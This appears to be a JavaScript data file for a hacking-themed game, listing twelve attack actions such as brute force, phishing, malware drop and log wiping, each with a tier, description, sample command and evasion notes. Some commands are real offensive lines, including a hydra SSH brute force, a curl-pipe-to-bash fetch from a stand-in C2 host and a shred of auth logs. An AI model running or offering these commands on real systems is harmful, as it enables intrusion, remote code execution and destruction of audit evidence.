export const action_description = [
  {
    id: 0,
    name: "Brute Force",
    complexityTier: "Tier 1 (Novice)",
    description: "Executes automated high-speed dictionary attacks to crack passwords and system keys.",
    command: "hydra -l admin -P /wordlists/rockyou.txt <TARGET_IP> ssh",
    hiddenDetails: "Generates extreme log noise. Triggers account lockouts and IP rate-limiting if unthrottled."
  },
  {
    id: 1,
    name: "Phishing Kit",
    complexityTier: "Tier 1 (Novice)",
    description: "Deploys cloned authentication portals and social engineering vectors to harvest user credentials.",
    command: "phish-deploy --template corporate_login --relay-smtp <MAIL_SERVER>",
    hiddenDetails: "Targets human error rather than code vulnerabilities. Yields high result rates on non-MFA targets."
  },
  {
    id: 2,
    name: "Exploit Script",
    complexityTier: "Tier 3 (Advanced)",
    description: "Executes targeted payloads against known code vulnerabilities to secure remote shell access.",
    command: "python3 exploit_cve.py --host <TARGET_IP> --payload rev_shell",
    hiddenDetails: "High impact. Can cause target service crashes if memory offsets are incorrectly calculated."
  },
  {
    id: 3,
    name: "Port Scanner",
    complexityTier: "Tier 1 (Novice)",
    description: "Probes target IP ranges to map active hosts, open ports, and running service protocols.",
    command: "nmap -sS -T4 -p 1-65535 <TARGET_IP>",
    hiddenDetails: "Low execution cost. Essential for early recon, but easily picked up by basic Intrusion Detection Systems (IDS)."
  },

  {
    id: 4,
    name: "Deep Scanner",
    complexityTier: "Tier 2 (Intermediate)",
    description: "Performs deep banner-grabbing and OS fingerprinting to expose specific unpatched software vulnerabilities.",
    command: "vulnscan --deep --service-version <TARGET_IP>",
    hiddenDetails: "Reveals actionable CVEs for direct exploitation, but increases target server CPU load during analysis."
  },
  {
    id: 5,
    name: "Packet Sniffer",
    complexityTier: "Tier 2 (Intermediate)",
    description: "Switches local interfaces into promiscuous mode to passively capture unencrypted data streams in transit.",
    command: "tcpdump -i eth0 -A 'tcp port 80 or tcp port 21'",
    hiddenDetails: "100% passive and completely invisible unless ARP spoofing is required to reroute network traffic."
  },
  {
    id: 6,
    name: "Credential Stuffing",
    complexityTier: "Tier 2 (Intermediate)",
    description: "Injects massive dumps of previously leaked credential pairs across target login endpoints.",
    command: "stuff-auth --combo breach_dump.txt --endpoint https://<TARGET>/api/login",
    hiddenDetails: "Relies heavily on cross-site password reuse. Requires rotating proxy pools to evade automated IP bans."
  },
  {
    id: 7,
    name: "Session Hijack",
    complexityTier: "Tier 3 (Advanced)",
    description: "Intercepts or predicts active session tokens to impersonate an authenticated user without password access.",
    command: "hijack-session --cookie 'SESSIONID=x9f8a2...' --target-user admin",
    hiddenDetails: "Bypasses primary authentication controls completely. Operates within normal traffic patterns to avoid detection."
  },
  {
    id: 8,
    name: "Malware Drop",
    complexityTier: "Tier 3 (Advanced)",
    description: "Establishes a staging link to download persistent backdoors, keyloggers, or RATs onto the target machine.",
    command: "curl -s http://c2.server/stage2.sh | bash",
    hiddenDetails: "Establishes long-term persistence. Requires obfuscation to slip past local Endpoint Detection & Response (EDR)."
  },
  {
    id: 9,
    name: "DDoS Burst",
    complexityTier: "Tier 3 (Advanced)",
    description: "Rallies botnet clusters to flood target network pipelines, causing server exhaustion and outages.",
    command: "botnet-flood --type syn-flood --target <TARGET_IP> --rate 10Gbps",
    hiddenDetails: "Overwhelms target availability entirely, but leaves massive network traces and cannot extract sensitive data."
  },
  {
    id: 10,
    name: "Zero-Day Attack",
    complexityTier: "Tier 4 (Apex)",
    description: "Unleashes an undisclosed vulnerability vector with zero existing patches or signature detections.",
    command: "run-0day --vector kernel_alloc --target-kernel 6.x",
    hiddenDetails: "Near-guaranteed entry past all traditional security barriers. Extremely rare resource that burns upon usage."
  },
  {
    id: 11,
    name: "Log Wiper",
    complexityTier: "Tier 4 (Apex)",
    description: "Systematically purges audit logs, shell histories, and system traces to blind incident response teams.",
    command: "shred -u /var/log/auth.log && clear-eventlog -all",
    hiddenDetails: "Removes attribution and trace trails. Sudden total log gaps can itself trigger secondary integrity alerts."
  }
]